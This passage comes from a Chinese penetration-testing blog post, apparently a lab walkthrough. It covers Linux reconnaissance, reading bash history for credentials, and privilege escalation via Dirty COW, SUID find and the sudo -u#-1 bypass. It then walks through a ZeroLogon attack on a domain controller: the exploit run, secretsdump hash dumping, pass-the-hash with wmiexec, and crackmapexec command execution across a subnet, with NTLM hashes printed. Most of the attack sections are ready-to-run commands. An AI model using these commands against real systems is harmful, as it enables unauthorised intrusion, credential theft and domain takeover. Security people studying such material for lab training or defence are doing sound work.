<h3 id="二-、查询网络和端口信息"><a href="#二-、查询网络和端口信息" class="headerlink" title="(二)、查询网络和端口信息"></a>(二)、查询网络和端口信息</h3><p>ifconfig<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637290158660-72cfe70d-8cae-49a5-a884-f57d2f62f4db.png#clientId=ub25c32ed-7728-4&from=paste&height=801&id=KOmCo&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1602&originWidth=2000&originalType=binary&ratio=1&size=379151&status=done&style=none&taskId=ue54ca82f-63b6-4209-a6c8-2290c029519&width=1000" alt="image.png"><br>netstat -anlp<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637290927930-4a21ebfd-a8ac-4d75-874e-3edb39a6e699.png#clientId=ub25c32ed-7728-4&from=paste&height=801&id=XHVW0&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1602&originWidth=2000&originalType=binary&ratio=1&size=427551&status=done&style=none&taskId=ua651ab00-c527-49ee-98a2-69da3e92e3d&width=1000" alt="image.png"><br>arp -a<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637291482885-1aee5696-1723-443d-ac73-65b8000c0757.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=86&id=HkZfX&margin=%5Bobject%2Object%5D&name=image.png&originHeight=172&originWidth=684&originalType=binary&ratio=1&size=26289&status=done&style=none&taskId=u21e21953-55ad-4fd2-91de-4127b28f557&width=342" alt="image.png"><br>route -n<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637291494753-6ec91ec1-101c-424b-9027-23eae6ab69ed.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=103&id=WuhY5&margin=%5Bobject%2Object%5D&name=image.png&originHeight=206&originWidth=806&originalType=binary&ratio=1&size=28212&status=done&style=none&taskId=ub6f23330-7fcd-4808-b571-e7d16b19da5&width=403" alt="image.png"></p>
<h3 id="三-、查询进程列表"><a href="#三-、查询进程列表" class="headerlink" title="(三)、查询进程列表"></a>(三)、查询进程列表</h3><p>ps -ef<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637291518216-624dafb6-e8af-4710-a6ea-895cefc43f16.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=571&id=rr7gx&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1142&originWidth=1472&originalType=binary&ratio=1&size=217286&status=done&style=none&taskId=uf2d85d50-2957-4f8a-9392-3d813dcd9ee&width=736" alt="image.png"></p>
<h3 id="四-、查询系统和补丁信息"><a href="#四-、查询系统和补丁信息" class="headerlink" title="(四)、查询系统和补丁信息"></a>(四)、查询系统和补丁信息</h3><p>通过查询内核版本 uname -a 或者使用rpm -qa来查询安装了哪些软件包<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637291547516-4bd15a37-178d-4edf-b6de-b5b544470abb.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=62&id=U7Xvb&margin=%5Bobject%2Object%5D&name=image.png&originHeight=124&originWidth=1034&originalType=binary&ratio=1&size=17626&status=done&style=none&taskId=uc5104c92-cbbe-45a3-bf09-6084f343ccc&width=517" alt="image.png"></p>
<h3 id="五-、凭证收取"><a href="#五-、凭证收取" class="headerlink" title="(五)、凭证收取"></a>(五)、凭证收取</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.bash_history    //历史输入命令</span><br><span class="line">cat ~<span class="regexp">/.bash_history    /</span>/历史输入命令</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637291595270-9cbd6a0e-8bd5-4a65-87c3-5c5ac91d80d6.png#clientId=u8f3ccd2c-8aad-4&from=paste&height=458&id=kyumg&margin=%5Bobject%2Object%5D&name=image.png&originHeight=916&originWidth=1216&originalType=binary&ratio=1&size=108949&status=done&style=none&taskId=ua4bd845b-a56a-44a0-96b7-3d4104ad576&width=608" alt="image.png"></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w			//目前登录的用户</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637384907870-cbcc406e-9b12-40b1-a5f6-dddb6cd33ecd.png#clientId=u8b09942e-e541-4&from=paste&height=137&id=u0f528df4&margin=%5Bobject%2Object%5D&name=image.png&originHeight=274&originWidth=1694&originalType=binary&ratio=1&size=42057&status=done&style=none&taskId=ue5d29e3b-7c82-4a3b-8890-86c4fba88ba&width=847" alt="image.png"></p>
<h2 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h2><p>为了安全性考虑，渗透测试的站点往往会对一些数据库或者站点进行降权处理，降低了管理站点或者数据库的权限，防止攻击者获取了权限之后直接可以造成更大的威胁。这也就是表示在渗透测试过程中，我们获取的网站权限为低权限，只能做有限的一些操作，如果要突破当前主机进行内网渗透的话，我们需要拿到相对高的权限例如管理员权限，这样才能在当前服务器的基础上实现内网渗透。<br>然后我们了解一下服务器的权限划分，在windows系统中，最高权限为system系统权限，最低的为guest权限。在linux系统中，最高权限为root权限。</p>
<h3 id="一-、内核漏洞提权"><a href="#一-、内核漏洞提权" class="headerlink" title="(一)、内核漏洞提权"></a>(一)、内核漏洞提权</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>系统对应内核存在某些漏洞，并且没有打上补丁，即有可能存在内核漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue #查看发行版本</span><br><span class="line">uname -r			 #查看内核版本</span><br></pre></td></tr></table></figure>
<h4 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h4><p>1、首先通过linux提权辅助工具linux-exploit-suggester来判断哪些漏洞可以用来溢出提权。<br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318079473-925168ef-36e2-4362-bdce-0f268b3faacf.png#height=76&id=aBOun&originHeight=127&originWidth=644&originalType=binary&ratio=1&status=done&style=none&width=386"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318080032-a34cbd56-6e60-463a-9f9c-2a475fa17b54.png#height=337&id=zsgHP&originHeight=562&originWidth=643&originalType=binary&ratio=1&status=done&style=none&width=386"></p>
<p>2、这里选择脏牛——CVE-2016-5195来进行提权。首先下载对应的exp，使用命令gcc -pthread dirty.c -o dirty -lcrypt命令对dirty.c进行编译，编译完成后会生成一个dirty文件。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318080482-05c1c49c-f756-4ca1-a3cb-ce7815c26c3b.png#height=48&id=qtBVx&originHeight=80&originWidth=589&originalType=binary&ratio=1&status=done&style=none&width=353"><br>3、执行dirty文件提权，在后面输入密码，获取一个firefart用户名，密码为我输入的密码的账户。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318081041-3cb8262d-b5c9-40b2-9256-54acc636a43c.png#height=195&id=hYnkU&originHeight=325&originWidth=586&originalType=binary&ratio=1&status=done&style=none&width=352"><br>4、登录该用户，查看，已经成功获取root权限<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318081223-83b0a7b8-c7e3-4c47-a4ab-bc3db5d95500.png#height=103&id=eELb9&originHeight=185&originWidth=750&originalType=binary&ratio=1&status=done&style=none&width=416"></p>
<h3 id="二-、SUID提权"><a href="#二-、SUID提权" class="headerlink" title="(二)、SUID提权"></a>(二)、SUID提权</h3><p>SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。例如apt-get命令需要以root权限才能执行，我们可以设置apt-get对的SUID，那么低权限用户也可以以root权限执行apt-get操作。<br>SUID的常见标识就是使用‘s’替换了‘x’。<br>1、使用以下命令发现系统上运行的SUID可执行文件</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318081557-9100eeed-49a0-46df-99f0-800f31780304.png#height=321&id=zqbsj&originHeight=535&originWidth=626&originalType=binary&ratio=1&status=done&style=none&width=376"><br>2、查看find命令，发现确实是使用了s来替换x。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318081785-60c598e0-625e-4320-9efc-de3ac133e3ec.png#height=34&id=Jp3Qa&originHeight=57&originWidth=533&originalType=binary&ratio=1&status=done&style=none&width=320"><br>3、借助find命令进行命令执行，成功以root权限执行了命令<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318082072-187ee537-6e22-40d6-86d7-90e0d79eea2b.png#height=109&id=AA5qX&originHeight=189&originWidth=724&originalType=binary&ratio=1&status=done&style=none&width=416"></p>
<h3 id="三-、Sudo配置错误"><a href="#三-、Sudo配置错误" class="headerlink" title="(三)、Sudo配置错误"></a>(三)、Sudo配置错误</h3><p>sudo上存在这样一个漏洞，只要用户在使用sudo命令时指定UID为-1或4294967295，就可以以root身份执行命令。<br>1、以root权限执行id命令<br>sudo -u#-1 id<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318082241-61d04431-5d41-4561-a8e6-bc325d7b7e41.png#height=44&id=Ls49H&originHeight=73&originWidth=516&originalType=binary&ratio=1&status=done&style=none&width=310"><br>2、以root权限执行whoami命令<br>sudo -u#-1 whoami<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318082642-d69053b9-591d-4aa0-828c-a7c2d9c5eb64.png#height=77&id=MW6V0&originHeight=128&originWidth=479&originalType=binary&ratio=1&status=done&style=none&width=287"></p>
<h2 id="六、横向移动"><a href="#六、横向移动" class="headerlink" title="六、横向移动"></a>六、横向移动</h2><p>横向移动方法很多，详细的可以查看上一篇<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10543#toc-27">内网渗透初探(二) | 内网渗透全过程重新学习</a>，这里介绍一种在2020年公开的，可以直接攻击域控的漏洞。</p>
<h3 id="一-、CVE-2020-1472"><a href="#一-、CVE-2020-1472" class="headerlink" title="(一)、CVE-2020-1472"></a>(一)、CVE-2020-1472</h3><p>NetLogon 远程协议是一种在 Windows 域控上使用的 RPC 接口，被用于各种与用户和机器认证相关的任务。最常用于让用户使用 NTLM 协议登录服务器，也用于 NTP 响应认证以及更新计算机域密码。<br>微软MSRC于8月11日 发布了Netlogon 特权提升漏洞安全通告。此漏洞CVE编号CVE-2020-1472， CVSS 评分:10.0。由 Secura 公司的 Tom Tervoort 发现提交并命名为 ZeroLogon。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用的工具：</span><br><span class="line"><span class="number">1</span>、<span class="keyword">exp</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com/VoidSec/CVE-<span class="number">2020</span>-<span class="number">1472</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、impacket工具包</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com/SecureAuthCorp/impacket/</span><br></pre></td></tr></table></figure>


<p>1、首先获取域内信息</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;Domain Controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>
<p>这里获取了域ajie.cool、域控主机名AD<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637076896508-2689080d-88d3-4f7a-b08b-0e4ebc6e88e6.png#clientId=ue7eccb44-f42f-4&from=paste&height=176&id=ud77b6008&margin=%5Bobject%2Object%5D&name=image.png&originHeight=352&originWidth=834&originalType=binary&ratio=1&size=45819&status=done&style=none&taskId=ud8fd7f53-52e5-4e2f-aa45-a9d267a5adc&width=417" alt="image.png"><br>2、使用exp将域控密码置空</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-<span class="number">2020</span>-<span class="number">1472</span>-exploit.py -n 域控主机名 -t 域控IP</span><br><span class="line"></span><br><span class="line">python3 cve-<span class="number">2020</span>-<span class="number">1472</span>-exploit.py -n AD -t <span class="number">192.168</span>.<span class="number">30.128</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637077110745-ee11fe64-2b58-4914-934e-d8c73c819873.png#clientId=ue7eccb44-f42f-4&from=paste&height=257&id=ue0ae9862&margin=%5Bobject%2Object%5D&name=image.png&originHeight=514&originWidth=1252&originalType=binary&ratio=1&size=317092&status=done&style=none&taskId=u7ccd5b24-a198-4375-bd8a-bf804796415&width=626" alt="image.png"><br>这里已经成功将密码进行置空处理了<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637077962367-03626a7a-c52d-4410-b339-b0b26c4e1b65.png#clientId=ue7eccb44-f42f-4&from=paste&height=166&id=u981a0c16&margin=%5Bobject%2Object%5D&name=image.png&originHeight=332&originWidth=1494&originalType=binary&ratio=1&size=237654&status=done&style=none&taskId=u91fcdce5-985b-40a3-870f-c6428befd75&width=747" alt="image.png"><br>3、利用impacket工具包中的secretsdump.py脚本获取hash</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py ajie.cool/AD\$@<span class="number">192.168</span>.<span class="number">30.128</span> -<span class="keyword">no</span>-pass</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637078160101-8b4e7df5-43a1-4bb2-8022-44e671be85a4.png#clientId=ue7eccb44-f42f-4&from=paste&height=568&id=u8a3924e5&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1136&originWidth=1658&originalType=binary&ratio=1&size=1346806&status=done&style=none&taskId=uc487952f-6421-443f-a483-b81134733c9&width=829" alt="image.png"></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:f1de694efa543bb780da59c049541ea3:::</span><br><span class="line"></span><br><span class="line">AD$:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c<span class="number">0</span>:::</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到AD$的hash为<strong>31d6cfe0d16ae931b73c59d7e0c089c0</strong><br>即空密码<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637078235071-7613ea92-a605-4020-9516-6517fed24860.png#clientId=ue7eccb44-f42f-4&from=paste&height=90&id=u1ee3f6b4&margin=%5Bobject%2Object%5D&name=image.png&originHeight=180&originWidth=1592&originalType=binary&ratio=1&size=234980&status=done&style=none&taskId=u356f73e0-4eae-407f-ae66-67933343352&width=796" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637144065938-39dca644-6d04-41b1-b5ff-ef57f087c5d5.png#clientId=ufc749c39-060b-4&from=paste&height=234&id=u577d7426&margin=%5Bobject%2Object%5D&name=image.png&originHeight=468&originWidth=1354&originalType=binary&ratio=1&size=39529&status=done&style=none&taskId=u408d4d94-ad64-4f91-bf90-ca20a9d977d&width=677" alt="image.png"><br>获取hash后便可以进行hash破解或PTH了，这里就不多做展示。<br>4、下一步我们需要还原密码。<br>首先通过获取到的hash，可以通过wmiexec.py进行pth攻击，拿到一个shell</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes  aad3b435b51404eeaad3b435b51404ee:f1de694efa543bb780da59c049541ea3 Administrator@192.<span class="number">168.30</span>.<span class="number">128</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637078490483-2de33b46-35cd-440c-bee2-bab9f1dd14d2.png#clientId=ue7eccb44-f42f-4&from=paste&height=219&id=u837cac3e&margin=%5Bobject%2Object%5D&name=image.png&originHeight=438&originWidth=2100&originalType=binary&ratio=1&size=425717&status=done&style=none&taskId=u8887ffc9-6f9a-42d6-a1d8-4dd34567adb&width=1050" alt="image.png"><br>5、中间省略获取权限到远程桌面到步骤了，也可以CS上线啥的，主要为了方便下载system.save、sam.save、security.save文件即可。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637078739050-653004d3-db21-4580-9b6d-b8b94163c0a3.png#clientId=ue7eccb44-f42f-4&from=paste&height=195&id=ud6f23377&margin=%5Bobject%2Object%5D&name=image.png&originHeight=390&originWidth=726&originalType=binary&ratio=1&size=52653&status=done&style=none&taskId=ua87f7644-dd14-46cc-b631-b8aaba2f6a9&width=363" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637079152796-903ecb9c-522c-4c30-bd99-e123c9fe5801.png#clientId=ue7eccb44-f42f-4&from=paste&height=385&id=ucf60de00&margin=%5Bobject%2Object%5D&name=image.png&originHeight=770&originWidth=1422&originalType=binary&ratio=1&size=147646&status=done&style=none&taskId=u1041dddd-6217-4017-84e4-cea0ed14843&width=711" alt="image.png"><br>6、通过secretsdump.py获取保存的hash（文件路径根据自己的来设置，我这里因为在桌面所以通过../../跳转了）</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam ../../sam.save -<span class="keyword">system</span> ../../system.save -security ../../security.save LOCAL</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637079292054-b83210a7-3ca4-4729-9ca3-c4881b1eb9e1.png#clientId=ue7eccb44-f42f-4&from=paste&height=456&id=u9c4b12c3&margin=%5Bobject%2Object%5D&name=image.png&originHeight=912&originWidth=2144&originalType=binary&ratio=1&size=1021579&status=done&style=none&taskId=uae5ede94-e79e-44d2-b0c7-4dda3a6e70c&width=1072" alt="image.png"><br>框出来的那一串，后面部门即为原本的hash</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">75</span>f490ed04ba66f04e0e947a185679bd</span><br></pre></td></tr></table></figure>
<p>7、通过工具还原密码</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 reinstall_original_pw.py AD <span class="number">192.168</span>.<span class="number">30.128</span> <span class="number">75</span>f490ed04ba66f04e0e947a185679bd</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637079773497-9ee7e4fe-2661-472a-8fc9-4a093dfd5670.png#clientId=ue7eccb44-f42f-4&from=paste&height=127&id=u62a4eb1f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=254&originWidth=1516&originalType=binary&ratio=1&size=224899&status=done&style=none&taskId=u57758a1d-951d-4feb-9a26-fdb9426e58c&width=758" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637079752705-87101606-e42d-44fb-96bf-e9e10d2efc32.png#clientId=ue7eccb44-f42f-4&from=paste&height=423&id=ufba0d359&margin=%5Bobject%2Object%5D&name=image.png&originHeight=846&originWidth=1912&originalType=binary&ratio=1&size=443208&status=done&style=none&taskId=udfbed3cd-db68-4946-8232-675a616526c&width=956" alt="image.png"><br>8、尝试了一下，no-pass利用失败了<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1637079829078-8c038afc-6723-4d0d-954a-8d65b5ad1a99.png#clientId=ue7eccb44-f42f-4&from=paste&height=222&id=u519475f1&margin=%5Bobject%2Object%5D&name=image.png&originHeight=444&originWidth=2128&originalType=binary&ratio=1&size=366886&status=done&style=none&taskId=u761ace07-a4c8-4ec8-bdb2-1aebffe6fa4&width=1064" alt="image.png"></p>
<h2 id="七、扩大战果"><a href="#七、扩大战果" class="headerlink" title="七、扩大战果"></a>七、扩大战果</h2><p>前面已经获取到域控的NTLM hash，那么后面可以使用Crackmapexec批量获取主机权限（通过域控NTLM hash，以及指定IP段进行攻击）<br>kali下进行安装</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install crackmapexec</span><br></pre></td></tr></table></figure>
<p>输入如下命令即可</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb <span class="number">192.168</span>.<span class="number">30.1</span>/<span class="number">24</span> -u administrator -H f1de694efa543bb780da59c049541ea3 -d ajie.cool -<span class="keyword">x</span> whoami</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IP ：指定要攻击的IP段</span><br><span class="line">-u ：指定用户名</span><br><span class="line">-H ：指定NTLM Hash</span><br><span class="line">-d ：指定域</span><br><span class="line">-x ：执行系统命令·</span><br></pre></td></tr></table></figure>
<p>可以看到返回了域控的管理员<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1638620784141-64f01ce3-2296-43d5-9051-97fb7670036c.png#clientId=u5a46042e-15ff-4&from=paste&height=421&id=u41016ea9&margin=%5Bobject%2Object%5D&name=image.png&originHeight=842&originWidth=1330&originalType=binary&ratio=1&size=832147&status=done&style=none&taskId=u1c34ae5a-3bef-444d-a5cb-e78f0f9f0d2&width=665" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb <span class="number">192.168</span>.<span class="number">30.1</span>/<span class="number">24</span> -u administrator -H f1de694efa543bb780da59c049541ea3 -d ajie.cool -x ipconfig</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1638621116816-264d72c0-ba90-449a-8374-86ca0e8319e6.png#clientId=u5a46042e-15ff-4&from=paste&height=345&id=uaa1ed240&margin=%5Bobject%2Object%5D&name=image.png&originHeight=690&originWidth=1944&originalType=binary&ratio=1&size=614545&status=done&style=none&taskId=u2cc5dc90-b4bf-4364-8069-6b0656b74fe&width=972" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1638621144529-da2876a4-9506-4bfc-ae44-a704e2797d37.png#clientId=u5a46042e-15ff-4&from=paste&height=405&id=u42369057&margin=%5Bobject%2Object%5D&name=image.png&originHeight=810&originWidth=1968&originalType=binary&ratio=1&size=776712&status=done&style=none&taskId=ubc84b4fb-a598-433e-9d99-5f6577f6268&width=984" alt="image.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">jasson</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://j-jasson2.github.io/2021/12/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2(%E4%B8%89)%EF%BD%9C%E5%B7%AE%E7%BC%BA%E8%A1%A5%E6%BC%8F/">https://j-jasson2.github.io/2021/12/11/内网渗透初探(三)｜差缺补漏/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://j-jasson2.github.io" target="_blank">jasson个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="/images/neiwang.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/19/%E5%AE%9E%E6%88%98xray+burp%E6%8C%96%E6%8E%98%E9%80%9A%E7%94%A8%E5%9E%8B%E6%BC%8F%E6%B4%9E/"><img class="prev-cover" src="/images/src_wajue.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">实战xray+burp挖掘通用型漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2021/11/28/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BD%9CCVE-2021-43798%20-%20Grafana%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="https://img0.baidu.com/it/u=4294281519,3704037899&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=952&amp;h=500" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">漏洞分析｜CVE-2021-43798 - Grafana文件读取漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/10/02/内网渗透初探(一)/" title="内网渗透初探(一)"><img class="cover" src="/images/neiwang.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-02</div><div class="title">内网渗透初探(一)</div></div></a></div><div><a href="/2021/11/22/内网渗透初探(二)/" title="内网渗透初探(二)"><img class="cover" src="/images/neiwang.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-22</div><div class="title">内网渗透初探(二)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">jasson</div><div class="author-info__description">专注于Web、内网渗透、红蓝攻防、代码审计，分享知识，分享生活。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">72</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/j-jasson2"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">二、外网打点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">3.</span> <span class="toc-text">三、权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E3%80%81%E9%9A%90%E8%97%8F%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95"><span class="toc-number">3.1.</span> <span class="toc-text">(一)、隐藏历史记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-%E3%80%81SSH%E5%85%AC%E9%92%A5%E5%86%99%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">(二)、SSH公钥写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-%E3%80%81SSH%E8%BD%AF%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.3.</span> <span class="toc-text">(三)、SSH软连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B-%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.4.</span> <span 